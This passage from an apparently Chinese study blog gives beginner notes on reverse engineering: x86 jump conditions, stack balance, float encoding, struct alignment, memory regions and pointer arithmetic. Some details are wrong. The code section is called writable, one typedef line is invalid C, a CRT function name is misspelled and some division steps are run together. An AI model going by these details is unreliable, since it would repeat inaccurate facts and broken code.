0</td></tr><tr><td>JB，JNAE</td><td>小于则跳转</td><td>CF = 1</td></tr><tr><td>JNB，JAE</td><td>大于等于则跳转（无符号数）</td><td>CF = 0</td></tr><tr><td>JBE，JNA</td><td>小于等于则跳转（无符号数）</td><td>CF=1 or ZF=1</td></tr><tr><td>JNBE，JA</td><td>大于则跳转（无符号数）</td><td>CF = 0 and ZF=0</td></tr><tr><td>JL，JNGE</td><td>小于则跳转（有符号数）</td><td>SF!=OF</td></tr><tr><td>JNL，JGE</td><td>大于则跳转（有符号数）</td><td>SF=OF</td></tr><tr><td>JLE，JNG</td><td>小于等于则跳转（有符号数）</td><td>ZF=1 or SF!=OF</td></tr><tr><td>JNLE，JG</td><td>大于则跳转（有符号数）</td><td>ZF=0 and SF=OF</td></tr></tbody></table><br><h1 id="0x04-堆栈"><a href="#0x04-堆栈" class="headerlink" title="0x04 堆栈"></a>0x04 堆栈</h1><p>堆栈平衡：调用完一个函数前和调用完一个函数后，堆栈没有变化。</p><p>在函数结束之后的平衡叫做<strong>外平栈</strong></p><br><h1 id="0x05-vc6-0工具使用"><a href="#0x05-vc6-0工具使用" class="headerlink" title="0x05 vc6.0工具使用"></a>0x05 vc6.0工具使用</h1><p>主要是快捷键，vscode没办法反汇编，所以先用着vc6.0</p><p>f5运行</p><p>f7生成文件</p><p>f9下断点</p><p>shift + f5结束程序</p><p>下断点运行之后，才能看内存和寄存器</p><p>反汇编之后：f11 = odf7 ，f10 = odf8</p><br><h1 id="0x06-c语言与反汇编"><a href="#0x06-c语言与反汇编" class="headerlink" title="0x06 c语言与反汇编"></a>0x06 c语言与反汇编</h1><h2 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">返回类型 __declspec(naked) 函数名(形参)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译器不会管裸函数，我们可以在裸函数里面直接写汇编</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __declspec(naked) <span class="built_in">fun</span>()&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不写ret的话里面一行汇编都没有，会导致函数call完无法返回，所以我们加ret让这个函数正确执行。</p><h2 id="控制台程序的入口"><a href="#控制台程序的入口" class="headerlink" title="控制台程序的入口"></a>控制台程序的入口</h2><p>KERNEL32调用mainCRTStartup()函数，然后mainCRTStartup()调用main函数。</p><p>main函数被调用前要先调用的函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GetVersion</span>()<span class="comment">//获取当前操作系统的版本</span></span><br><span class="line">_head_init()<span class="comment">//初始化堆栈空间大小</span></span><br><span class="line"><span class="built_in">GetCommandLineA</span>()<span class="comment">//获取命令行参数</span></span><br><span class="line">_crtGetEnvironmentStringsA()<span class="comment">//获取环境变量</span></span><br><span class="line">_setargv()</span><br><span class="line">_setenvp()</span><br><span class="line">_cinit()</span><br></pre></td></tr></table></figure><p>main函数经过vc6编译会变成3个参数。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型的三个要素：</p><ol><li><p>存储数据的宽度</p></li><li><p>存储数据的格式</p></li><li><p>作用域</p></li></ol><hr><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><table><thead><tr><th>整数类型</th><th>bit</th><th>字节</th><th>宽度</th></tr></thead><tbody><tr><td>char</td><td>8bit</td><td>1字节</td><td>byte</td></tr><tr><td>short</td><td>16bit</td><td>2字节</td><td>word</td></tr><tr><td>int</td><td>32bit</td><td>4字节</td><td>dword</td></tr><tr><td>long</td><td>32bit</td><td>4字节</td><td>dword</td></tr></tbody></table><p>unsigned无符号数</p><p>有符号数和无符号数在内存中是完全一样的，只是看你想怎么用它。</p><hr><h3 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h3><p><strong>浮点数是如何存储到内存中的：</strong></p><p>float的存储方式</p><p><img src="https://i.loli.net/2020/08/28/hW4Ju7lbHOE3ZCt.png" alt="image-20200828213506250.png"></p><ol><li>先将这个浮点数的绝对值值化为二进制</li><li>将这个二进制数的小数点左移或者右移n位，直到小数点移动到前面只剩一个1</li><li>从小数点右边第一位开始数出二十三位数字放入第22到第0位。</li><li>如果实数是正的，则在第31位放入0，否则放入1。</li><li>如果n是左移得到的，说明指数是正的，第30位放入1。如果n是右移得到的或n=0，则在第30位放入0。</li><li>将n减去1后化为二进制，把值去掉第一位放入第29到第23位（7位）。</li></ol><p>因为float尾数部分只有24位，所以能精确到小数点后六位。不存在无符号float，因为第一位就是符号位了。</p><p><strong>double是64位的，8个字节（float是4个字节）</strong></p><br><p>首先把浮点数转换为二进制</p><p>例：8.25</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">整数部分转换：</span><br><span class="line">8/2 = 40</span><br><span class="line">4/2 = 20</span><br><span class="line">2/2 = 10</span><br><span class="line">1/2 = 0 1</span><br><span class="line">1000</span><br><span class="line">小数部分转换：</span><br><span class="line">0.25*2 = 0.50</span><br><span class="line">0.5*2  = 1.01</span><br><span class="line">1000.01</span><br></pre></td></tr></table></figure><p>8.25可以用二进制表示为1000.01</p><p>但如果是8.4就会进入死循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0.4 * 2 = 0.80</span><br><span class="line">0.8 * 2 = 1.61</span><br><span class="line">0.6 * 2 = 1.21</span><br><span class="line">0.2 * 2 = 0.40</span><br></pre></td></tr></table></figure><p>这时候需要精确位数。</p><p>接着8.25继续，将小数点右移或者左移</p><p>1.00001 * 2^3</p><p>然后把00001存到尾数部分，后面跟着步骤来。</p><table><thead><tr><th>31符号位</th><th>23~30指数部分</th><th>0~22位数部分</th></tr></thead><tbody><tr><td>0</td><td>10000010</td><td>00001000000000000000000</td></tr></tbody></table><p>所以在内存中存入的值是41040000。</p><p> 如果是-8.25，也只需要变符号位</p><table><thead><tr><th>31符号位</th><th>23~30指数部分</th><th>0~22位数部分</th></tr></thead><tbody><tr><td>1</td><td>10000010</td><td>00001000000000000000000</td></tr></tbody></table><p>在内存中存入的值就是c1040000。</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>标准aciss码由1个字节组成，最高位为0。</p><p>gb2312由2个字节组成，最高位为1。</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p>从逆向的角度来说</p><p>执行最快的是do while循环，其次是while循环，效率最差的是for循环。</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p><code>struct</code></p><p>基值就是全局变量，偏移就是结构体中的一个一个的属性。</p><p><strong>结构特别大的时候，是通过堆栈复制传到函数中的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub esp.18h</span><br><span class="line">mov ecx,6</span><br><span class="line">lea esi,[ebp-18h]</span><br><span class="line">mov edi,esp</span><br><span class="line">rep movsd</span><br></pre></td></tr></table></figure><h3 id="结构体对齐"><a href="#结构体对齐" class="headerlink" title="结构体对齐"></a>结构体对齐</h3><p>本质是：选择效率还是选择空间</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(n)</span></span><br><span class="line"><span class="comment">//结构体</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br></pre></td></tr></table></figure><p><strong>对齐参数：n为字节对齐数，其取值为1、2、4、8，vc6.0默认为8</strong></p><p>n和结构体成员的sizeof值（宽度）作比较，结构体成员的对齐数取两者的最小值。（主要看图吧，说不明白）</p><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(n)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    __int64 b;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br></pre></td></tr></table></figure><p>如果n为1，也就是1字节对齐。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//13</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/nyUhvK1sYxErJ69.png" alt="image-20200909111214659.png"></p><p>2字节对齐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//14</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/I6dy48pPHFk3fCB.png" alt="image-20200909111400075.png"></p><p>4字节对齐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/iXgO7jUQ3Z9rNaW.png" alt="image-20200909111410178.png"></p><p>8字节对齐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//24</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/t2eMUwdouiyfaPv.png" alt="image-20200909111424322.png"></p><h3 id="对齐原则"><a href="#对齐原则" class="headerlink" title="对齐原则"></a>对齐原则</h3><ul><li>结构体的大小，是结构内部最大字节成员的整数倍，不足会补齐。（例如结构中最大的类型是int类型，结构体的大小就是4字节的整数倍。而不是8的整数倍），和上面的例子其实是一回事，默认参数为8。</li><li>有疑惑建议写代码，可以参考上述的例子</li><li>建议写代码时，由小到大的顺序进行书写，可以节省空间。</li></ul><h2 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h2><p>typedef作用是为一种数据类型定义一个新名字。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> BYTE;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> WORD;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> DWORD;</span><br></pre></td></tr></table></figure><p>对数组的操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> vector v[<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vector v;<span class="comment">//相当于int v[10]</span></span><br><span class="line">    v[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    v[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>参数传递的时候，宽度默认为4</p><p><code>ebp-4(-8-c-10)</code>通常用来存储局部数据（类似于函数内的局部变量）</p><p><code>ebp+4</code>用来存储返回地址</p><p><code>ebp+8(+c+10)</code>通常用来存储参数</p><p><code>eax</code>通常用来存储函数的返回值</p><h2 id="字符串数组"><a href="#字符串数组" class="headerlink" title="字符串数组"></a>字符串数组</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> arr[<span class="number">10</span>];</span><br><span class="line">arr[<span class="number">0</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">arr[<span class="number">2</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">arr[<span class="number">3</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">arr[<span class="number">4</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">arr[<span class="number">5</span>] = <span class="string">&#x27;\0&#x27;</span>;<span class="comment">//or 0 or null</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,arr);</span><br></pre></td></tr></table></figure><p>如果没有<code>\0</code>结果会出现垃圾数据，可以通过gb2312编码输出中文。</p><br><h1 id="0x07-C语言与内存"><a href="#0x07-C语言与内存" class="headerlink" title="0x07 C语言与内存"></a>0x07 C语言与内存</h1><p>一个程序在内存中执行的时候，会把程序分成几个区域。</p><h2 id="代码区"><a href="#代码区" class="headerlink" title="代码区"></a>代码区</h2><p>可读可写，用来存放代码。</p><h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><p>函数不调用时不分配堆栈。堆栈用来存放参数，局部变量，临时数据。</p><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>动态申请的，大小是可变的。</p><p>可读可写。</p><h2 id="全局变量区"><a href="#全局变量区" class="headerlink" title="全局变量区"></a>全局变量区</h2><p>可读可写，存储全局变量。</p><h2 id="常量区"><a href="#常量区" class="headerlink" title="常量区"></a>常量区</h2><p>只读，存储常量。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* x = <span class="string">&quot;china&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> y[] = <span class="string">&quot;china&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    *(x+<span class="number">1</span>) = <span class="string">&#x27;A&#x27;</span>;<span class="comment">//不能修改，因为*x存着&quot;china&quot;，china是字符常量。</span></span><br><span class="line">    x = <span class="string">&quot;aaa&quot;</span>;<span class="comment">//但是x的值可以修改。</span></span><br><span class="line">    y[<span class="number">1</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>y把china的值拷贝到了堆栈里，改的不是china，而是堆栈里的值。</p><p>x则是直接存储china的地址，所以无法修改。有疑惑可以看看反汇编。</p><hr><p><strong>全局变量的特点：</strong></p><ol><li><p>全局变量在程序编译完成后地址就已经确定下来了，只要程序启动，全局变量就会存在。启动后里面是否有值取决于声明是否给定了初始值，如果没有，默认为0。</p></li><li><p>全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值。</p></li><li><p>全局变量直到程序结束才会被释放</p></li><li><p>全局变量就是所谓的<strong>基址</strong></p></li><li><p><strong>全局变量的反汇编识别：如果看到一个直接的地址，那它就是全局变量。因为它早确定了不会改了。</strong></p></li></ol><p><strong>局部变量的特点：</strong></p><ol><li>局部变量在程序编译完成后并没有分配固定的地址</li><li>在所属的函数没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存。</li><li>当局部变量所属的函数执行完毕后，局部变量所占用的内存将变成垃圾数据，局部变量消失。</li><li>局部变量只能在函数内部使用，函数A无法使用函数B的局部变量</li><li><strong>局部变量的反汇编识别：[ebp-4]， [ebp-8]，[ebp-0xc]。</strong>不同的编译器有可能会是[esp+]，通过栈顶找值。</li></ol><br><h1 id="0x08-指针-1"><a href="#0x08-指针-1" class="headerlink" title="0x08 指针 1"></a>0x08 指针 1</h1><h2 id="带-类型的宽度"><a href="#带-类型的宽度" class="headerlink" title="带*类型的宽度"></a>带*类型的宽度</h2><p><strong>任何数据类型加上*（不管是一个*还是多个*）都会变成新的类型，宽度为4字节(32位系统)</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SS</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* x;</span><br><span class="line">    <span class="keyword">short</span>**** y;</span><br><span class="line">    <span class="keyword">int</span>* z;</span><br><span class="line">    SS* b;</span><br><span class="line">    x = (<span class="keyword">char</span>*)<span class="number">1</span>;</span><br><span class="line">    y = (<span class="keyword">short</span>****)<span class="number">2</span>;</span><br><span class="line">    z = (<span class="keyword">int</span>*)<span class="number">3</span>;</span><br><span class="line">    b = (SS*)<span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="带-类型的-–"><a href="#带-类型的-–" class="headerlink" title="带*类型的++ –"></a>带*类型的++ –</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* a;</span><br><span class="line">    <span class="keyword">short</span>* b;</span><br><span class="line">    <span class="keyword">int</span>* c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>*)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>*)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>*)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a++;</span><br><span class="line">    b++;</span><br><span class="line">    c++;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//101 102 104</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>去掉一个星号之后的宽度决定加几减几。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">short</span>*** b;</span><br><span class="line">    <span class="keyword">int</span>**** c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>***)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>****)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a++;</span><br><span class="line">    b++;</span><br><span class="line">    c++;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//32位系统104 104 104</span></span><br><span class="line">    <span class="comment">//64位系统108 108 108</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>char**去掉一个*宽度为4，short ***去掉一个*宽度也为4。</p><h2 id="带-类型的加减法"><a href="#带-类型的加减法" class="headerlink" title="带*类型的加减法"></a>带*类型的加减法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* a;</span><br><span class="line">    <span class="keyword">short</span>* b;</span><br><span class="line">    <span class="keyword">int</span>* c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>*)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>*)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>*)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a+=<span class="number">5</span>;</span><br><span class="line">    b+=<span class="number">5</span>;</span><br><span class="line">    c+=<span class="number">5</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//105 110 120</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和前面一样，先去掉*看字节宽度，然后char+5就是5×1。short就是5×2。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">short</span>** b;</span><br><span class="line">    <span class="keyword">int</span>** c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>**)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>**)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a+=<span class="number">5</span>;</span><br><span class="line">    b+=<span class="number">5</span>;</span><br><span class="line">    c+=<span class="number">5</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//120 120 120</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理</p><p><strong>总结</strong></p><ul><li>带*类型的变量可以加、减一个整数，但是不能乘除。(编译器不允许)</li><li>带*类型变量与其他整数相加或相减的时候：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">带*类型变量 + N = 带*类型变量 + N*(去掉一个*后类型的宽度)</span><br><span class="line">带*类型变量 - N = 带*类型变量 - N*(去掉一个*后类型的宽度)</span><br></pre></td></tr></table></figure><h2 id="两个带-的类型相减"><a href="#两个带-的类型相减" class="headerlink" title="两个带*的类型相减"></a>两个带*的类型相减</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* a;</span><br><span class="line"><span class="keyword">char</span>* b;</span><br><span class="line">a = (<span class="keyword">char</span>*)<span class="number">200</span>;</span><br><span class="line">b = (<span class="keyword">char</span>*)<span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> x = a-b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);<span class="comment">//100</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">char</span>** b;</span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">200</span>;</span><br><span class="line">    b = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> x = a-b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);<span class="comment">//25((200-100)/4)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>两个类型相同的带*类型的变量可以进行减法操作</li><li>想减的结果要除以去掉一个*的数据的宽度</li><li><strong>两个带*类型相减完的结果是int</strong></li></ol><h2 id="两个带-的类型作比较"><a href="#两个带-的类型作比较" class="headerlink" title="两个带*的类型作比较"></a>两个带*的类型作比较</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">char</span>** b;</span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">200</span>;</span><br><span class="line">    b = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span>(a&gt;b)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure><p>带*的变量，如果类型相同，可以做大小的比较。</p><br><h1 id="0x09-指针-2"><a href="#0x09-指针-2" class="headerlink" title="0x09 指针 2"></a>0x09 指针 2</h1><h2 id="取地址符-amp"><a href="#取地址符-amp" class="headerlink" 